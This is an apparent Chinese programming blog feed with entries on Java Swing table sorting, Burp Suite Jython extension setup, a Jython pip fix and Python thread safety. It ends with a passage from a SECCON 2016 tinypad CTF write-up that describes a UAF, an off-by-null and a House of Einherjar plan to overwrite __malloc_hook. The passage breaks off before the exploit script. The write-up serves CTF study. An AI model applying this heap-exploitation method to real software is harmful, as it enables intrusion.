class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getWidth() - var6.right - <span class="hljs-built_in">this</span>.sortArrow.getIconWidth();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var5.y;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Point</span>(var7, var8);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmptyIcon</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Icon</span>, Serializable &#123;<br>        <span class="hljs-type">int</span> width;<br>        <span class="hljs-type">int</span> height;<br><br>        <span class="hljs-keyword">private</span> <span class="hljs-title function_">EmptyIcon</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-built_in">this</span>.width = <span class="hljs-number">0</span>;<br>            <span class="hljs-built_in">this</span>.height = <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintIcon</span><span class="hljs-params">(Component var1, Graphics var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">int</span> var4)</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getIconWidth</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.width;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getIconHeight</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.height;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>运行效果：<br><img src="demo.png" alt="demo.png"></p><p>图中以第0列为主排序列，第1列为次排序列进行排序。（若需要实现通过显示1、2、3表明主排序列和次排序列，重写<code>Renderer</code>的<code>getTableCellRendererComponent</code>方法）</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Burpsuite Python插件开发 - 编程环境篇</title>
    <link href="/2019/11/15/burpsuite-python-extension-code-env/"/>
    <url>/2019/11/15/burpsuite-python-extension-code-env/</url>
    
    <content type="html"><![CDATA[<h4 id="java2python"><a href="#java2python" class="headerlink" title="java2python"></a>java2python</h4><p>使用<a href="https://github.com/natural/java2python">java2python</a>将网上的java代码（如swing示例代码）转成python，方便开发。java2python基于python2编写，也很久没维护了，但还是可以用用。</p><p>安装（直接使用<code>pip install java2python</code>安装不成功，参考<a href="https://github.com/natural/java2python/issues/40）：">https://github.com/natural/java2python/issues/40）：</a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">virtualenv -p python2 env_j2py<br>. env_j2py<span class="hljs-regexp">/bin/</span>activate<br>pip install http:<span class="hljs-regexp">//</span>antlr3.org<span class="hljs-regexp">/download/</span>Python/antlr_python_runtime-<span class="hljs-number">3.1</span>.<span class="hljs-number">3</span>.tar.gz<br>pip install https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/downloads/</span>natural<span class="hljs-regexp">/java2python/</span>java2python-<span class="hljs-number">0.5</span>.<span class="hljs-number">1</span>.tar.gz<br></code></pre></div></td></tr></table></figure><p>使用：</p><ol><li><p>输入文件： 执行<code>j2py file.java</code></p></li><li><p>使用标准输出： 执行<code>j2py</code>， 输入java代码，按Ctrl+d 结束输入</p></li></ol><p>结果有些错误，需手动修改下</p><h4 id="使用IDEA开发"><a href="#使用IDEA开发" class="headerlink" title="使用IDEA开发"></a>使用IDEA开发</h4><p>参考：<a href="https://overthread99.wordpress.com/2017/07/11/import-java-jars-into-intellij-jython-project/">https://overthread99.wordpress.com/2017/07/11/import-java-jars-into-intellij-jython-project/</a></p><ol><li><p>新建工程，选择Empty Project</p></li><li><p>安装Python插件：File-&gt;Settings-&gt;Plugins，搜索Python插件并安装</p></li><li><p>设置SDK：File-&gt;Project Structure-&gt;project-&gt;选择Jython.exe作为SDK</p></li><li><p>添加Libraries：File-&gt;Projcet Structure-&gt;Libraries-&gt;点击+按钮（New Project Library）-&gt;选择Java-&gt;选择JDK里JRE里的lib目录。<br><img src="burpsuite_python_extension_code_env_1.png" alt="addJavaLibraries.png"><br>再添加一项选择burpsuite.jar路径</p></li><li><p>IDEA支持对Java类、方法的Auto-complete。（PyChram不支持）</p></li></ol><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>利用简单的输出来调试：</p><ol><li><p><code>print(&quot;output&quot;)</code>、<code>callback.printOutput(&quot;output&quot;)</code>：输出到Extender-&gt;选择自己的插件-&gt;Extensions-&gt;Output</p></li><li><p><code>callback.printError(&quot;error&quot;)</code>：输出到Extender-&gt;选择自己的插件-&gt;Extensions-&gt;Errors</p></li></ol><p>使用pdb调试burpsuite插件的Python代码层（参考： <a href="https://www.foote.pub/2015/04/08/burp-extender-python.html）：">https://www.foote.pub/2015/04/08/burp-extender-python.html）：</a></p><ol><li><p>在实现<code>IBurpExtender</code>的<code>registerExtenderCallbacks(self, callbacks)</code>方法里加上：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import sys<br>sys<span class="hljs-selector-class">.stdout</span> = callbacks<span class="hljs-selector-class">.getStdout</span>()<br>sys<span class="hljs-selector-class">.stderr</span> = callbacks<span class="hljs-selector-class">.getStderr</span>()<br></code></pre></div></td></tr></table></figure></li><li><p>在需要调试的地方加<code>import pdb; pdb.set_trace()</code>来下断点</p></li><li><p>使用终端运行burpsuite：<code>java -jar -Xmx1g -XX:MaxPermSize=1G burpsuite_pro.jar</code> 。（也可以配置IDEA的<code>Run/Debug Configurations</code>，添加一项<code>Jar Application</code>类型的运行配置，示例：）<br><img src="burpsuite_python_extension_code_env_2.png" alt="runConfigurationExample.png"></p></li><li><p>burpsuite添加自己的插件，并将插件的<code>Output</code>和<code>Errors</code>勾选为<code>Output to system console</code></p></li><li><p>当运行到<code>pdb.set_trace()</code>时终端就出现pdb调试会话。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Burpsuite</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决Win下Jython安装pip失败的问题</title>
    <link href="/2019/11/06/install-jython-pip-in-win/"/>
    <url>/2019/11/06/install-jython-pip-in-win/</url>
    
    <content type="html"><![CDATA[<p>安装Jython时发现pip没成功装上，导致不能方便地安装模块。这里用一种临时的解决方式来解决这个问题，主要还是期待Jython官方支持CPython3。</p><p>我的环境：</p><blockquote><p>Win10 x64<br>Java 1.8.0<br>Jython 2.7.1</p></blockquote><h4 id="Jython安装步骤"><a href="#Jython安装步骤" class="headerlink" title="Jython安装步骤"></a>Jython安装步骤</h4><ol><li><p>下载Jython Installer的jar包，到<a href="https://www.jython.org/download">https://www.jython.org/download</a> 或者 <a href="http://repo.maven.apache.org/maven2/org/python/jython-installer/">http://repo.maven.apache.org/maven2/org/python/jython-installer/</a> 下载</p></li><li><p>运行jython Installer的jar包，选择Standard模式安装（假设安装到<code>D:\jython2.7.1</code>目录）</p></li><li><p>Standard模式下是有勾选安装pip的，实际上是安装失败了。</p><blockquote><p>找问题所在：<br>通过命令行安装方式（<code>java -jar D:\jython-installer-2.7.1.jar  --console</code>）安装打印如下错误：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">Installing pip <span class="hljs-keyword">and</span> setuptools<br><span class="hljs-number">90</span> %<br>Exception:<br>Traceback (most recent call <span class="hljs-keyword">last</span>):<br>...<br><br>File <span class="hljs-string">&quot;D:\test\jython\Lib\platform.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1396</span>, <span class="hljs-keyword">in</span> <span class="hljs-keyword">system</span><br> <span class="hljs-literal">return</span> uname()[<span class="hljs-number">0</span>]<br>File <span class="hljs-string">&quot;D:\test\jython\Lib\platform.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1213</span>, <span class="hljs-keyword">in</span> uname<br> machine = os.uname()[<span class="hljs-number">4</span>]<br>IllegalArgumentException: java.lang.IllegalArgumentException: Cannot <span class="hljs-built_in">create</span> PyString <span class="hljs-keyword">with</span> non-<span class="hljs-keyword">byte</span> <span class="hljs-built_in">value</span><br><br></code></pre></div></td></tr></table></figure><p>调用<code>os.uname()</code>时错误。搜了下，windows下没有<code>os.uname()</code>函数。所以就修改调用<code>os.uname()</code>的地方</p></blockquote></li></ol><p>执行CPython命令<code>python -c &quot;import platform; print(platform.uname())&quot;</code>，例如打印出：</p>   <figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">uname_result(<span class="hljs-attribute">system</span>=<span class="hljs-string">&#x27;Windows&#x27;</span>, <span class="hljs-attribute">node</span>=<span class="hljs-string">&#x27;DESKTOP-XXX&#x27;</span>, <span class="hljs-attribute">release</span>=<span class="hljs-string">&#x27;10&#x27;</span>, <span class="hljs-attribute">version</span>=<span class="hljs-string">&#x27;10.0.18362&#x27;</span>, <span class="hljs-attribute">machine</span>=<span class="hljs-string">&#x27;AMD64&#x27;</span>, <span class="hljs-attribute">processor</span>=<span class="hljs-string">&#x27;...&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>   打开<code>D:\jython2.7.1\Lib\platform.py</code>，根据上面的输出修改两处：</p>   <figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">1213</span>行：<br>    node = <span class="hljs-title">_node</span>()<br>    <span class="hljs-comment"># machine = os.uname()[4]</span><br>    machine = <span class="hljs-string">&quot;AMD64&quot;</span><br>    <br><span class="hljs-number">1271</span>行：<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># system,node,release,version,machine = os.uname()</span><br>        <span class="hljs-keyword">system</span>,node,release,<span class="hljs-built_in">version</span>,machine = (<span class="hljs-string">&#x27;Windows&#x27;</span>, <span class="hljs-string">&#x27;DESKTOP-XXX&#x27;</span>, <span class="hljs-string">&#x27;10&#x27;</span>, <span class="hljs-string">&#x27;10.0.18362&#x27;</span>, <span class="hljs-string">&#x27;AMD64&#x27;</span>)<br>    except AttributeError:<br>        no_os_uname = <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><ol start="4"><li><p>安装pip：<code>D:\jython2.7.1\bin\jython.exe -m ensurepip</code></p></li><li><p>使用Jython pip安装模块，以<code>jsbeautifier</code>模块为例：<code>D:\jython2.7.1\bin\jython.exe -m pip install jsbeautifier</code>。</p><p>安装<code>jsbeautifier</code>时打印如下错误，也给出了错误原因和解决方法：</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">java.lang.RuntimeException: java.lang.RuntimeException:<br>Encountered too large method code in<br>D:\jython2.<span class="hljs-number">7.1</span>\Lib\site-packages\jsbeautifier\tests\generated\tests.<span class="hljs-keyword">py</span><br>   <br>Please provide <span class="hljs-keyword">a</span> CPython <span class="hljs-number">2.7</span> bytecode <span class="hljs-keyword">file</span> (.pyc) <span class="hljs-keyword">to</span> proceed, <span class="hljs-keyword">e</span>.g. run<br><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> py_compile D:\jython2.<span class="hljs-number">7.1</span>\Lib\site-packages\jsbeautifier\tests\generated\tests.<span class="hljs-keyword">py</span><br><span class="hljs-built_in">and</span> <span class="hljs-keyword">try</span> again.<br>   <br>Alternatively provide proper CPython <span class="hljs-number">2.7</span> <span class="hljs-keyword">execute</span> <span class="hljs-keyword">command</span> via<br>cpython_cmd property, <span class="hljs-keyword">e</span>.g. <span class="hljs-keyword">call</span><br>    jython -J-Dcpython_cmd=<span class="hljs-keyword">python</span><br><span class="hljs-built_in">or</span> <span class="hljs-keyword">if</span> running pip <span class="hljs-keyword">on</span> Jython:<br>    pip install --<span class="hljs-keyword">global</span>-option=<span class="hljs-string">&quot;-J-Dcpython_cmd=python&quot;</span> <span class="hljs-symbol">&lt;package&gt;</span><br></code></pre></div></td></tr></table></figure><p>由于我没装CPython2.7，而且jsbeautifier模块也可以正常导入就没去管了。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python线程不安全示例</title>
    <link href="/2019/11/02/python-multi-thread-not-safe-example/"/>
    <url>/2019/11/02/python-multi-thread-not-safe-example/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Value<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">测试多线程、多进程、gevent协程下的线程安全问题（或者说是进程安全/协程安全）</span><br><span class="hljs-string">再python3.7下测试， 运行前先安装gevent模块： pip install gevent</span><br><span class="hljs-string"></span><br><span class="hljs-string">一次运行结果实例：</span><br><span class="hljs-string">test_multithread: 194</span><br><span class="hljs-string">test_multiprocess: 0</span><br><span class="hljs-string">test_multiprocess_s:  192</span><br><span class="hljs-string">test_gevent: 13</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.i = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inc</span>(<span class="hljs-params">self</span>):<br>        tmp = self.i<br>        tmp += <span class="hljs-number">1</span><br>        time.sleep(<span class="hljs-number">0.001</span>)<br>        self.i = tmp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inc_2</span>(<span class="hljs-params">self</span>):<br>        tmp = self.i<br>        tmp += <span class="hljs-number">1</span><br>        self.i = tmp<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_multithread</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在上面的inc方法加上time.sleep(0.001)后，最后打印出来的值远远小于线程数2000；</span><br><span class="hljs-string">    如果是time.sleep(1)，这里一般是打印出1；</span><br><span class="hljs-string">    如果没sleep， 通常打印出2000（即等于线程数），虽然这是线程不安全的。可能是由于CPU运行飞快、GIL的存在等原因，导致出现看似线程安全的结果</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    foo = Foo()<br>    thread_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>        thread = Thread(target=foo.inc)<br>        thread_list.append(thread)<br>    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> thread_list:<br>        thread.start()<br>    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> thread_list:<br>        thread.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_multithread:&quot;</span>, foo.i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_gevent</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    gevent使用协程来实现并发。协程只在发生I/O、调用sleep等的时候进行切换。一般不用考虑线程安全的问题</span><br><span class="hljs-string">    不过这里最后输出的将会远远小于2000。因为在遇到sleep时进行了协程切换，所以协程切换不能发生在应当是原子操作的代码之间</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 下面这句patch会让test_multithread函数卡住无法返回（。 所以test_gevent函数需在测试完多线程后再执行</span><br>    <span class="hljs-keyword">from</span> gevent <span class="hljs-keyword">import</span> monkey; monkey.patch_all()<br>    <span class="hljs-keyword">import</span> gevent<br><br>    foo = Foo()<br>    threads = [gevent.spawn(foo.inc) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>)]<br>    gevent.joinall(threads)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_gevent:&quot;</span>, foo.i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_multiprocess</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    每个进程的foo变量各自独立，不共享，所以这里打印出0，在主进程的foo.i没被计算到，</span><br><span class="hljs-string">    需要将foo改为进程共享变量，才能观察其是 进程不安全 的，看下面的test_multiprocess_2函数</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    foo = Foo()<br>    process_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>        process = Process(target=foo.inc)<br>        process_list.append(process)<br>    <span class="hljs-keyword">for</span> process <span class="hljs-keyword">in</span> process_list:<br>        process.start()<br>    <span class="hljs-keyword">for</span> process <span class="hljs-keyword">in</span> process_list:<br>        process.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_multiprocess:&quot;</span>, foo.i)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inc_s</span>(<span class="hljs-params">i</span>):<br>    i.value += <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 加锁的写法：</span><br>    <span class="hljs-comment"># with i.get_lock():</span><br>    <span class="hljs-comment">#     i.value += 1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_multiprocess_s</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在+=操作不加锁的情况下，这里打印的将是小于进程数200。 这是个进程不安全的例子。</span><br><span class="hljs-string">    在multiprocessing模块官方文档有这么一句话说multiprocessing.Value是进程/线程安全的</span><br><span class="hljs-string">    &gt; These shared objects will be process and thread-safe.</span><br><span class="hljs-string">    这句话是说在python字节代码层面上对该类型的读或写操作时是进程/线程安全的。但对于整个自增操作就不是了。</span><br><span class="hljs-string">    以下是自增变量的字节代码，并注释了Value加锁的位置，参考 https://eli.thegreenplace.net/2012/01/04/shared-counter-with-pythons-multiprocessing 这篇文章</span><br><span class="hljs-string">     0 LOAD_FAST                0 (val)</span><br><span class="hljs-string">     3 DUP_TOP</span><br><span class="hljs-string">                                         #&lt;--- Value lock acquired</span><br><span class="hljs-string">     4 LOAD_ATTR                0 (value)</span><br><span class="hljs-string">                                         #&lt;--- Value lock released</span><br><span class="hljs-string">     7 LOAD_CONST               1 (1)</span><br><span class="hljs-string">    10 INPLACE_ADD</span><br><span class="hljs-string">    11 ROT_TWO</span><br><span class="hljs-string">                                         #&lt;--- Value lock acquired</span><br><span class="hljs-string">    12 STORE_ATTR               0 (value)</span><br><span class="hljs-string">                                         #&lt;--- Value lock released</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    shared_value = Value(<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-number">0</span>)<br>    process_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>        process = Process(target=inc_s, args=(shared_value, ))<br>        process_list.append(process)<br>    <span class="hljs-keyword">for</span> process <span class="hljs-keyword">in</span> process_list:<br>        process.start()<br>    <span class="hljs-keyword">for</span> process <span class="hljs-keyword">in</span> process_list:<br>        process.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;test_multiprocess_s: &quot;</span>, shared_value.value)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    test_multithread()<br>    test_multiprocess()<br>    test_multiprocess_s()<br>    test_gevent()<br><br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SECCON 2016 tinypad题目</title>
    <link href="/2019/01/11/ctf-seccon-2016-tinypad/"/>
    <url>/2019/01/11/ctf-seccon-2016-tinypad/</url>
    
    <content type="html"><![CDATA[<p>文件：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad</a></p><p>checksec下：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></div></td></tr></table></figure><h4 id="程序操作"><a href="#程序操作" class="headerlink" title="程序操作"></a>程序操作</h4><figure class="highlight mercury"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mercury">添加<span class="hljs-meta">memo</span>：    申请的大小范围：<span class="hljs-number">1</span> - <span class="hljs-number">0</span>x100<br>删除<span class="hljs-meta">memo</span>：    存在UAF<br>编辑<span class="hljs-meta">memo</span>：<br><br>使用read_until函数读取<span class="hljs-meta">memo</span>内容，该函数有off-by-null<br></code></pre></div></td></tr></table></figure><h4 id="程序数据存储："><a href="#程序数据存储：" class="headerlink" title="程序数据存储："></a>程序数据存储：</h4><figure class="highlight mercury"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mercury">tinypad+<span class="hljs-number">256</span>起存储memos<br>每个<span class="hljs-meta">memo</span>是<span class="hljs-number">0</span>x10字节：<br><span class="hljs-number">8</span>字节：<span class="hljs-meta">memo</span>长度<br>    <span class="hljs-number">8</span>字节：指向<span class="hljs-meta">memo</span>内容<br></code></pre></div></td></tr></table></figure><h4 id="pwn脚本"><a href="#pwn脚本" class="headerlink" title="pwn脚本"></a>pwn脚本</h4><p>思路：通过off-by-null，利用House of Einherjar构造overlapping chunk，再覆盖fast chunk的fd指针，指向<code>__malloc_hook</code>附近，将<code>__malloc_hook</code>覆盖成<code>one_gadget</code>。</p><p>tinypad_pwn.py：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 